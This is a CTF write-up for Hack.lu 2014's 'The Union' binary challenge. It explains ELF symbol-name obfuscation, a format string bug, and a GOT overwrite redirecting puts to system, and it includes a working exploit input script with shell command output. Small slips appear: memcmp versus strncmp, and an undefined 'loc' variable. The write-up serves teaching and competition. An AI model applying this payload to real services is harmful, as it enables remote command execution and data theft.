# Hack.lu CTF 2014: The Union

**Category:** Exploiting
**Points:** 200
**Author:** sqall
**Description:**

> Our biggest competitor the mining corporation, The Union, has a new way of organizing its mining facilities. On the surface, it looks like a mining location archive. But our man inside told us, it has a secret trapdoor that we can use to infiltrate the corporation and steal their secret. We need their secret. They have one success after another and it will not be long until we are finished. Our informant also told us that not everything is what it seems to be. We do not know what this means. Luckily for us, he managed to get us the blueprints of the system. So we should be able to study them before we went for the heist. So, this is your job. Study the blueprints and then go for the valuable `secret.txt`. This is everything we need to overcome them.
>
> Download: [theunion_9edfcf7b247775ab57da993863bfaabd](theunion_9edfcf7b247775ab57da993863bfaabd)
>
> `nc wildwildweb.fluxfingers.net 1423`

## Write-up

When connecting to the server, it greets us with the following prompt:

```
	Welcome to
 _   _                        _             _
| |_| |__   ___   _   _ _ __ (_) ___  _ __ ( )___
| __| '_ \ / _ \ | | | | '_ \| |/ _ \| '_ \|// __|
| |_| | | |  __/ | |_| | | | | | (_) | | | | \__ \
 \__|_| |_|\___|  \__,_|_| |_|_|\___/|_| |_| |___/

			mining archive.

Please give the unions slogan and secret word:
```

By looking at the disassembly of the binary, we figure out that the password is the string `gold>silver`, concatenated with the contents of the file `salt.txt`, which we don’t know.

When playing with the binary locally, we noticed the following oddity: even if we had a trailing newline in the `salt.txt`, we could still get access even though the input password is read without the trailing newline. This caused us to take a closer look at the string comparison part of the code:

```
080489af         mov        dword [ss:esp+0x8], 0xc         # argument 3 ??
080489b7         mov        eax, dword [ss:ebp+var_40]
080489ba         mov        dword [ss:esp+0x4], eax         # argument 2
080489be         lea        eax, dword [ss:ebp+var_21]
080489c1         mov        dword [ss:esp], eax             # argument 1
080489c4         call       strcmp@PLT
080489c9         test       eax, eax
080489cb         jne        0x80488fc
```

At this point we recalled the hint “not everything is what it seems to be” and figured that probably not `strcmp` is called, but `memcmp`, which takes an additional `length` parameter. This means that actually only the first 12 characters of the password are checked, which is only one additional character to what we already know! After two tries we find the correct access code:

```
Please give the unions slogan and secret word:
gold>silverb
Correct slogan.

1) Add mine
2) Show mines
3) Delete mine
4) Show profit
5) Exit
```

Looking at the xrefs of some of the strings in the binary, we find the ‘trapdoor’:

```
1) Add mine
2) Show mines
3) Delete mine
4) Show profit
5) Exit
99
Ufff! You found our trapdoor.
Ok here you go. Everything in here is not what it seems to be.
If you do not understand this, you are not quite there yet.
```

That’s not really helpful. The disassembly of the function however is:

```
08049209         mov        ebp, esp
0804920b         sub        esp, 0x18
0804920e         mov        dword [ss:esp], 0x8049b08                           ; "Ufff! You found our trapdoor.", argument #1 for method puts@PLT
08049215         call       puts@PLT
0804921a         mov        eax, dword [ds:stdout]                              ; stdout
0804921f         mov        dword [ss:esp+0x4], eax                             ; argument #2 for method fputs@PLT
08049223         mov        dword [ss:esp], 0x8049b28                           ; "Ok here you go. Everything in here is not what it seems to be.\\n", argument #1 for method fputs@PLT
0804922a         call       fputs@PLT
0804922f         cmp        dword [ss:ebp+arg_0], 0x0
08049233         je         0x8049243

08049235         mov        dword [ss:esp], 0x8049b68                           ; "This is what you should use.", argument #1 for method printf@PLT
0804923c         call       printf@PLT
08049241         jmp        0x804924f

08049243         mov        dword [ss:esp], 0x8049b88                           ; "If you do not understand this, you are not quite there yet.", argument #1 for method puts@PLT, XREF=sub_8049208+43
0804924a         call       puts@PLT

0804924f         mov        eax, dword [ds:stdout]                              ; stdout, XREF=sub_8049208+57
08049254         mov        dword [ss:esp], eax                                 ; argument #1 for method fflush@PLT
08049257         call       fflush@PLT
0804925c         leave
0804925d         ret
```

Two things of interest:

1. `fputs(..., stdout)` is used, although it does the same thing as `puts`, which is used in the same function
2. The call to `printf` is unreachable, so probably some kind of hint.

We suspect that `fputs` and `printf` are also not what they seem. Some digging into the ELF headers confirms this: `DT_STRTAB` points to a string table that contains slightly different function names than the symbol table would have us believe. We note:

* `strcmp` is really `strncmp`
* `printf` is really `system`
* `fputs` is really `printf`

`printf` is never called with user input, but `fputs` is. This leaves us with a format string vulnerability, which can be triggered as follows:

```
1) Add mine
2) Show mines
3) Delete mine
4) Show profit
5) Exit
1
Please give the location:
%d
Please give the type of the mine:
foo
Please give the profit of the mine:
1
1) Add mine
2) Show mines
3) Delete mine
4) Show profit
5) Exit
4
Do you want to see the profit?
Location: Dingo canyon
Type: silver
y/n
n
Do you want to see the profit?
Location: Joe's rock
Type: gold
y/n
n
Do you want to see the profit?
Location: Dynamite Bill's boulder
Type: diamond
y/n
n
Do you want to see the profit?
Location: %d
Type: foo
y/n
y
Profit for location:
-143864192             <= this is the output of the printf
foo
1
```

When breaking on `fputs@PLT`, we can inspect the stack layout and we find that the user-controlled string `Type: foo` is conveniently located at stack offset `42`.

From here the exploit is straightforward: We perform two 2-byte writes to overwrite `puts@GOT` (`0x0804b028`) so that it contains the address of `printf@PLT` (`0x080485e0`), which is really `system`. The type of our mine serves both as the pointers for the `%hn` modifiers and as the shell command we want to execute.

This Python script produces output that can be piped right into the server to get the flag:

```
print 'gold>silverb'
print 1
print '%2052d%12$hn%32220d%13$hn'
print loc
print 'sh #BB\x2a\xb0\x04\x08\x28\xb0\x04\x08'
print 1
print 4
print 'n\nn\nn\ny'
print 'cat secret.txt\n' * 100
```

And sure enough:

```bash
$ python input.py | nc wildwildweb.fluxfingers.net 1423
...
FLAG{d1aM0nd>G0lD}
FLAG{d1aM0nd>G0lD}
FLAG{d1aM0nd>G0lD}
FLAG{d1aM0nd>G0lD}
FLAG{d1aM0nd>G0lD}
FLAG{d1aM0nd>G0lD}
...
```

The flag is `FLAG{d1aM0nd>G0lD}`.

## Other write-ups and resources

* <http://barrebas.github.io/blog/2014/10/26/hack-dot-lu-the-union-write-up/>
* [ELF obfuscation: how to let analysis tools show incorrect external symbol calls](http://h4des.org/blog/index.php?/archives/346-ELF-obfuscation-let-analysis-tools-show-wrong-external-symbol-calls.html)
